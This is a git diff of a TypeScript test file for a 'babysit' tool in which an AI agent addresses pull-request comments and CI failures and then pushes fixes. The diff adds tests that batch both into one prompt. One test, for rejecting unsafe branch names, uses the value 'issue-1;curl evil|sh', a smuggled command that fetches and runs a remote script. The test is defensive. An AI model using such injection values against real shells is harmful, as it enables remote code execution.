@@ -2,7 +2,7 @@ import { describe, expect, test } from "bun:test";
 import type { PipelineConfig } from "./config";
 import type { ExecResult } from "./exec";
 import type { PrComment, PrFailedCheck, PrSummary } from "./github";
-import { babysitPr, isNewComment, isTrustedComment, matchesBranch, runBabysit } from "./babysit";
+import { babysitPr, buildFeedbackPrompt, isNewComment, isTrustedComment, matchesBranch, runBabysit } from "./babysit";
 
 const CONFIG = {
   commands: { lint: "run-lint", typecheck: "run-tc", test: "run-test" },
@@ -38,6 +38,9 @@ function makeDeps(opts: {
       if (cmd.startsWith("test -d")) return OK;
       if (cmd.startsWith("git log -1")) {
         return { code: 0, stdout: `${opts.lastCommit ?? "2026-07-20T09:00:00+09:00"}\n`, stderr: "" };
+      }
+      if (cmd === "git rev-parse HEAD") {
+        return { code: 0, stdout: "0123456789abcdef0123456789abcdef01234567\n", stderr: "" };
       }
       if (cmd.startsWith("git merge") && opts.mergeFails) return { code: 1, stdout: "CONFLICT", stderr: "" };
       return OK;
@@ -88,7 +91,7 @@ describe("babysitPr", () => {
     expect(h.execCalls.some((c) => c.startsWith("git push"))).toBe(true);
   });
 
-  test("新規コメントに composer が対応して push する", async () => {
+  test("新規コメントに composerFast が対応して push する", async () => {
     const h = makeDeps({
       comments: [
         { author: "koki", authorAssociation: "OWNER", body: "命名直して", path: "a.ts", createdAt: "2026-07-20T05:00:00Z" },
@@ -97,7 +100,7 @@ describe("babysitPr", () => {
     });
     const r = await babysitPr(h.deps, PR);
     expect(r.actions).toEqual(["comments-addressed(1)"]);
-    expect(h.agentCalls[0]!.agent).toBe("composer");
+    expect(h.agentCalls[0]!.agent).toBe("composerFast");
     expect(h.agentCalls[0]!.prompt).toContain("命名直して");
     expect(h.execCalls.some((c) => c.startsWith("git push"))).toBe(true);
   });
@@ -112,7 +115,7 @@ describe("babysitPr", () => {
     expect(h.execCalls.some((c) => c.startsWith("git push"))).toBe(false);
   });
 
-  test("CI 失敗時はログを composer に渡して修正して push する", async () => {
+  test("CI 失敗時はログを composerFast に渡して修正して push する", async () => {
     const h = makeDeps({
       failedChecks: [
         {
@@ -125,7 +128,7 @@ describe("babysitPr", () => {
     });
     const r = await babysitPr(h.deps, PR);
     expect(r.actions).toEqual(["ci-fixed(test-typescript)"]);
-    expect(h.agentCalls[0]!.agent).toBe("composer");
+    expect(h.agentCalls[0]!.agent).toBe("composerFast");
     expect(h.agentCalls[0]!.prompt).toContain("lint:test-co-location failed");
     expect(h.execCalls.some((c) => c.startsWith("git push"))).toBe(true);
   });
@@ -163,6 +166,31 @@ describe("babysitPr", () => {
   test("危険なブランチ名はシェル実行前に拒否される", async () => {
     const h = makeDeps({});
     expect(babysitPr(h.deps, { ...PR, headRefName: "issue-1;curl evil|sh" })).rejects.toThrow("ref");
+  });
+
+  test("コメントと CI 失敗が同時にあれば 1 回のエージェント呼び出しで一括対応する", async () => {
+    const h = makeDeps({
+      comments: [
+        { author: "koki", authorAssociation: "OWNER", body: "命名直して", path: "a.ts", createdAt: "2026-07-20T05:00:00Z" },
+      ],
+      failedChecks: [
+        { name: "test", conclusion: "FAILURE", detailsUrl: "https://github.com/x/y/actions/runs/42/job/1" },
+      ],
+      failedCiLog: "test failed",
+    });
+    const result = await babysitPr(h.deps, PR);
+    expect(h.agentCalls).toHaveLength(1);
+    expect(h.agentCalls[0]!.prompt).toContain("命名直して");
+    expect(h.agentCalls[0]!.prompt).toContain("test failed");
+    expect(result.actions).toEqual(["comments-addressed(1)", "ci-fixed(test)"]);
+  });
+});
+
+describe("buildFeedbackPrompt", () => {
+  test("コメントと CI の指示を同じプロンプトへまとめる", () => {
+    const prompt = buildFeedbackPrompt('[{"body":"直して"}]', "CI ログを直す");
+    expect(prompt).toContain("直して");
+    expect(prompt).toContain("CI ログを直す");
   });
 });
 
